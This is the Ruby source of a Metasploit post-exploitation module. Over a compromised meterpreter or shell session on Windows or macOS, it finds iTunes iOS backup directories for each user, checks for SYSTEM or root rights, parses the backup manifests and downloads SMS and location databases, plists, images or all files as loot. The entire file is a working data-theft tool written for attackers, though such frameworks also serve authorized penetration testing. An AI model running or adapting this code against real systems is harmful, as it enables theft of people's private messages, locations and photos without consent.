##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/apple_backup_manifestdb'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
      'Description'    => %q{ This module will collect sensitive files from any on-disk iOS device backups },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'hdm',
          'bannedit' # Based on bannedit's pidgin_cred module structure
        ],
      'Platform'       => %w{ osx win },
      'SessionTypes'   => ['meterpreter', 'shell']
    ))
    register_options(
      [
        OptBool.new('DATABASES',  [false, 'Collect all database files? (SMS, Location, etc)', true]),
        OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),
        OptBool.new('IMAGES', [false, 'Collect all image files?', false]),
        OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])
      ], self.class)
  end

  #
  # Even though iTunes is only Windows and Mac OS X, look for the MobileSync files on all platforms
  #
  #
  def run
    case session.platform
    when /osx/
      @platform = :osx
      paths = enum_users_unix
    when /win/
      @platform = :windows
      drive = session.sys.config.getenv('SystemDrive')
      os = session.sys.config.sysinfo['OS']

      if os =~ /Windows 7|Vista|2008/
        @appdata = '\\AppData\\Roaming'
        @users = drive + '\\Users'
      else
        @appdata = '\\Application Data'
        @users = drive + '\\Documents and Settings'
      end

      if session.type != "meterpreter"
        print_error "Only meterpreter sessions are supported on windows hosts"
        return
      end
      paths = enum_users_windows
    else
      print_error "Unsupported platform #{session.platform}"
      return
    end

    if paths.empty?
      print_status("No users found with an iTunes backup directory")
      return
    end

    process_backups(paths)
  end

  def enum_users_unix
    if @platform == :osx
      home = "/Users/"
    else
      home = "/home/"
    end

    if got_root?
      userdirs = []
      session.shell_command("ls #{home}").gsub(/\s/, "\n").split("\n").each do |user_name|
        userdirs << home + user_name
      end
      userdirs << "/root"
    else
      userdirs = [ home + whoami ]
    end

    backup_paths = []
    userdirs.each do |user_dir|
      output = session.shell_command("ls #{user_dir}/Library/Application\\ Support/MobileSync/Backup/")
      if output =~ /No such file/i
        next
      else
        print_status("Found backup directory in: #{user_dir}")
        backup_paths << "#{user_dir}/Library/Application\\ Support/MobileSync/Backup/"
      end
    end

    check_for_backups_unix(backup_paths)
  end

  def check_for_backups_unix(backup_dirs)
    dirs = []
    backup_dirs.each do |backup_dir|
      print_status("Checking for backups in #{backup_dir}")
      session.shell_command("ls #{backup_dir}").each_line do |dir|
        next if dir == "." || dir == ".."
        if dir =~ /^[0-9a-f]{16}/i
          print_status("Found #{backup_dir}\\#{dir}")
          dirs << ::File.join(backup_dir.chomp, dir.chomp)
        end
      end
    end
    dirs
  end

  def enum_users_windows
    paths = Array.new

    if got_root?
      begin
        session.fs.dir.foreach(@users) do |path|
          next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
          bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
          dirs = check_for_backups_win(bdir)
          dirs.each { |dir| paths << dir } if dirs
        end
      rescue ::Rex::Post::Meterpreter::RequestError
        # Handle the case of the @users base directory is not accessible
      end
    else
      print_status "Only checking #{whoami} account since we do not have SYSTEM..."
      path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
      dirs = check_for_backups_win(path)
      dirs.each { |dir| paths << dir } if dirs
    end
    return paths
  end

  def check_for_backups_win(bdir)
    dirs = []
    begin
        print_status("Checking for backups in #{bdir}")
        session.fs.dir.foreach(bdir) do |dir|
        if dir =~ /^[0-9a-f]{16}/i
          print_status("Found #{bdir}\\#{dir}")
          dirs << "#{bdir}\\#{dir}"
        end
      end
    rescue Rex::Post::Meterpreter::RequestError
      # Handle base directories that do not exist
    end
    dirs
  end

  def process_backups(paths)
    paths.each {|path| process_backup(path) }
  end

  def process_backup(path)

    print_status("Pulling data from #{path}...")

    mbdb_data = ""
    mbdx_data = ""

    print_status("Reading Manifest.mbdb from #{path}...")
    if session.type == "shell"
      mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
      if mbdb_data =~ /No such file/i
        print_status("Manifest.mbdb not found in #{path}...")
        return
      end
    else
      mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
      until mfd.eof?
        mbdb_data << mfd.read
      end
      mfd.close
    end

    print_status("Reading Manifest.mbdx from #{path}...")
    if session.type == "shell"
      mbdx_data = session.shell_command("cat #{path}/Manifest.mbdx")
      if mbdx_data =~ /No such file/i
        print_status("Manifest.mbdx not found in #{path}...")
        return
      end
    else
      mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
      until mfd.eof?
        mbdx_data << mfd.read
      end
      mfd.close
    end

    manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data, mbdx_data)

    patterns = []
    patterns << /\.db$/i if datastore['DATABASES']
    patterns << /\.plist$/i if datastore['PLISTS']
    patterns << /\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']
    patterns << /.*/ if datastore['EVERYTHING']

    done = {}
    patterns.each do |pat|
      manifest.entries.each_pair do |fname, info|
        next if done[fname]
        next if not info[:filename].to_s =~ pat

        print_status("Downloading #{info[:domain]} #{info[:filename]}...")

        begin

        fdata = ""
        if session.type == "shell"
          fdata = session.shell_command("cat #{path}/#{fname}")
        else
          mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
          until mfd.eof?
            fdata << mfd.read
          end
          mfd.close
        end
        bname = info[:filename] || "unknown.bin"
        rname = info[:domain].to_s + "_" + bname
        rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
        ctype = "application/octet-stream"

        store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")

        rescue ::Interrupt
          raise $!
        rescue ::Exception => e
          print_error("Failed to download #{fname}: #{e.class} #{e}")
        end

        done[fname] = true
      end
    end
  end


  def got_root?
    case @platform
    when :windows
      if session.sys.config.getuid =~ /SYSTEM/
        return true
      else
        return false
      end
    else # unix, bsd, linux, osx
      ret = whoami
      if ret =~ /root/
        return true
      else
        return false
      end
    end
  end

  def whoami
    if @platform == :windows
      session.sys.config.getenv('USERNAME')
    else
      session.shell_command("whoami").chomp
    end
  end
end
